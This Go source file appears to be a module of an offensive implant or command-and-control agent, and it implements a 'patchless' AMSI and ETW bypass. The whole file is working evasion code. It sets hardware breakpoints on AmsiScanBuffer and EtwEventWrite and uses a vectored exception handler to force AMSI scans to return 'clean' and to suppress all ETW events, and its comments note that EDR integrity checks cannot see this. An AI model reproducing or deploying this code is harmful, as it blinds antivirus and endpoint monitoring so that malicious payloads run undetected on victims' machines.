//go:build windows

package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Patchless AMSI / ETW bypass via Hardware Breakpoints (HWBP) + VEH.
//
// Hardware breakpoints live in CPU debug registers (DR0–DR3) and require no
// memory writes — EDRs that check .text integrity never see a modification.
// A Vectored Exception Handler (VEH) intercepts EXCEPTION_SINGLE_STEP and
// redirects execution / overrides return values before the real function runs.

// ─── AMD64 CONTEXT (manual layout matching winnt.h) ─────────────────────────
//
// windows.CONTEXT is not exported in golang.org/x/sys v0.42; we define the
// fields we need at their correct byte offsets.  Total struct = 1232 bytes.

type threadContext struct {
	// 0x00 – 0x2F  Home registers (spill area for leaf functions)
	P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
	// 0x30
	ContextFlags uint32
	MxCsr        uint32
	// 0x38  Segment selectors
	SegCs, SegDs, SegEs, SegFs, SegGs, SegSs uint16
	EFlags                                    uint32
	// 0x48  Debug registers
	Dr0, Dr1, Dr2, Dr3, Dr6, Dr7 uint64
	// 0x78  Integer registers
	Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi uint64
	R8, R9, R10, R11, R12, R13, R14, R15    uint64
	Rip                                      uint64 // 0xF8
	// 0x100 – 0x4CF  Floating-point, XMM, vector state (not used here)
	_fp [976]byte
}

// ─── Constants ───────────────────────────────────────────────────────────────

const (
	exceptionSingleStep     uint32  = 0x80000004
	exceptionContinueExec   uintptr = 0
	exceptionContinueSearch uintptr = 1

	// Context flags (amd64)
	ctxAMD64    uint32 = 0x00100000
	ctxControl  uint32 = ctxAMD64 | 0x01
	ctxDebugReg uint32 = ctxAMD64 | 0x10
	ctxFull     uint32 = ctxAMD64 | 0x0F
)

// exceptionRecord — minimal fields we actually inspect.
type exceptionRecord struct {
	ExceptionCode    uint32
	ExceptionFlags   uint32
	ExceptionRecord  *exceptionRecord
	ExceptionAddress uintptr
	_                [19]uintptr
}

type exceptionPointers struct {
	ExceptionRecord *exceptionRecord
	ContextRecord   *threadContext
}

// ─── Public API types (compat with commands.go) ───────────────────────────────

// HWBPSlot identifies one of the four hardware debug register slots (0–3).
type HWBPSlot int

// ─── Internal state ──────────────────────────────────────────────────────────

type hwbpEntry struct {
	addr    uintptr
	handler func(*threadContext) bool // returns true = continue (re-arm)
}

var (
	hwbpTable     [4]hwbpEntry
	hwbpVEHHandle uintptr
)

// ─── VEH callback ────────────────────────────────────────────────────────────

//go:nosplit
func hwbpVEHProc(epRaw uintptr) uintptr {
	ptrs := (*exceptionPointers)(unsafe.Pointer(epRaw))
	rec := ptrs.ExceptionRecord
	ctx := ptrs.ContextRecord

	if rec.ExceptionCode != exceptionSingleStep {
		return exceptionContinueSearch
	}

	for i := 0; i < 4; i++ {
		if hwbpTable[i].addr == 0 {
			continue
		}
		dr6Bit := uint64(1 << uint(i))
		if ctx.Dr6&dr6Bit == 0 {
			continue
		}
		ctx.Dr6 &^= dr6Bit

		// Temporarily disable the slot to avoid re-entrant firing.
		savedDR7 := ctx.Dr7
		ctx.Dr7 &^= uint64(1) << (uint(i) * 2) // clear L(i)

		if hwbpTable[i].handler != nil && hwbpTable[i].handler(ctx) {
			ctx.Dr7 = savedDR7 // re-arm for next invocation
		}
		return exceptionContinueExec
	}
	return exceptionContinueSearch
}

// ─── DR apply helpers ────────────────────────────────────────────────────────

func hwbpApplyAll(slot int, addr uintptr, enable bool) error {
	pid := windows.GetCurrentProcessId()
	snap, _, _ := procCreateToolhelp32Snapshot.Call(uintptr(th32csSnapThread), 0)
	if snap == ^uintptr(0) {
		return fmt.Errorf("hwbp: CreateToolhelp32Snapshot failed")
	}
	defer windows.CloseHandle(windows.Handle(snap))

	type threadEntry32 struct {
		Size, Usage, ThreadID, OwnerProcessID uint32
		BasePriority, DeltaPriority           int32
		Flags                                 uint32
	}
	var te threadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	r, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	for r != 0 {
		if te.OwnerProcessID == pid {
			hwbpApplyThread(te.ThreadID, slot, addr, enable)
		}
		r, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	return nil
}

func hwbpApplyThread(tid uint32, slot int, addr uintptr, enable bool) {
	hThread, _, _ := procOpenThread.Call(uintptr(threadAllAccess), 0, uintptr(tid))
	if hThread == 0 {
		return
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	procSuspendThread.Call(hThread)
	defer procResumeThread.Call(hThread)

	var ctx threadContext
	ctx.ContextFlags = ctxFull | ctxDebugReg
	procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))

	drPtrs := [4]*uint64{&ctx.Dr0, &ctx.Dr1, &ctx.Dr2, &ctx.Dr3}
	if enable {
		*drPtrs[slot] = uint64(addr)
		ctx.Dr7 |= uint64(1) << (uint(slot) * 2)
	} else {
		*drPtrs[slot] = 0
		ctx.Dr7 &^= uint64(1) << (uint(slot) * 2)
	}
	procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
}

func hwbpEnsureVEH() error {
	if hwbpVEHHandle != 0 {
		return nil
	}
	cb := windows.NewCallback(hwbpVEHProc)
	h, _, _ := procAddVectoredExceptionHandler.Call(1, cb)
	if h == 0 {
		return fmt.Errorf("hwbp: AddVectoredExceptionHandler failed")
	}
	hwbpVEHHandle = h
	return nil
}

// ─── Core set / clear ────────────────────────────────────────────────────────

func hwbpSetSlot(slot int, addr uintptr, handler func(*threadContext) bool) error {
	if slot < 0 || slot > 3 {
		return fmt.Errorf("hwbp: slot must be 0–3")
	}
	if hwbpTable[slot].addr != 0 {
		hwbpApplyAll(slot, 0, false) //nolint:errcheck
	}
	hwbpTable[slot] = hwbpEntry{addr: addr, handler: handler}
	if err := hwbpApplyAll(slot, addr, true); err != nil {
		hwbpTable[slot] = hwbpEntry{}
		return err
	}
	return hwbpEnsureVEH()
}

func hwbpClearSlot(slot int) error {
	if slot < 0 || slot > 3 {
		return fmt.Errorf("hwbp: slot must be 0–3")
	}
	hwbpApplyAll(slot, 0, false) //nolint:errcheck
	hwbpTable[slot] = hwbpEntry{}
	return nil
}

// hwbpClearAll removes all breakpoints and the VEH handler.
func hwbpClearAll() {
	for i := 0; i < 4; i++ {
		if hwbpTable[i].addr != 0 {
			hwbpApplyAll(i, 0, false) //nolint:errcheck
			hwbpTable[i] = hwbpEntry{}
		}
	}
	if hwbpVEHHandle != 0 {
		procRemoveVectoredExceptionHandler.Call(hwbpVEHHandle)
		hwbpVEHHandle = 0
	}
}

// ─── commands.go-compatible API ───────────────────────────────────────────────

// SetHWBP installs a no-op tracing breakpoint on slot at addr.
// The callback receives the hit address; the slot is re-armed after each hit.
func SetHWBP(slot HWBPSlot, addr uintptr, callback func(uintptr)) error {
	return hwbpSetSlot(int(slot), addr, func(ctx *threadContext) bool {
		if callback != nil {
			callback(addr)
		}
		return true // persistent
	})
}

// ClearHWBP removes the breakpoint on slot.
func ClearHWBP(slot HWBPSlot) error {
	return hwbpClearSlot(int(slot))
}

// ─── Patchless AMSI bypass ───────────────────────────────────────────────────

// bypassAMSIHWBP places an execute-breakpoint on AmsiScanBuffer.
// The VEH handler forces *pAmsiResult = AMSI_RESULT_CLEAN and returns S_OK,
// with no byte patches — invisible to .text integrity checks.
func bypassAMSIHWBP() error {
	amsi := windows.NewLazySystemDLL("amsi.dll")
	proc := amsi.NewProc("AmsiScanBuffer")
	if err := proc.Find(); err != nil {
		return fmt.Errorf("AmsiScanBuffer not found (AMSI not loaded): %w", err)
	}
	addr := proc.Addr()

	return hwbpSetSlot(0, addr, func(ctx *threadContext) bool {
		// 6th parameter (AMSI_RESULT*) is on stack at RSP+0x28 in x64 ABI.
		amsiResultPtr := *(*uintptr)(unsafe.Pointer(uintptr(ctx.Rsp) + 0x28))
		if amsiResultPtr != 0 {
			*(*uint32)(unsafe.Pointer(amsiResultPtr)) = 1 // AMSI_RESULT_CLEAN
		}
		ctx.Rax = 0 // S_OK
		ctx.Rip = *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp)))
		ctx.Rsp += 8
		return true
	})
}

// ─── Patchless ETW bypass ────────────────────────────────────────────────────

// bypassETWHWBP places an execute-breakpoint on EtwEventWrite.
// The VEH handler returns ERROR_SUCCESS immediately, silencing all ETW events.
func bypassETWHWBP() error {
	etwAddr := modNtdll.NewProc("EtwEventWrite").Addr()
	if etwAddr == 0 {
		return fmt.Errorf("EtwEventWrite not found in ntdll")
	}
	return hwbpSetSlot(1, etwAddr, func(ctx *threadContext) bool {
		ctx.Rax = 0
		ctx.Rip = *(*uint64)(unsafe.Pointer(uintptr(ctx.Rsp)))
		ctx.Rsp += 8
		return true
	})
}

// ─── Manual DR (operator: evasion hwbp set) ──────────────────────────────────

// hwbpSetManual registers a tracing breakpoint at addr on drIdx (0–3).
func hwbpSetManual(drIdx int, addr uintptr) error {
	return hwbpSetSlot(drIdx, addr, func(ctx *threadContext) bool {
		return true // no-op, just re-arm
	})
}
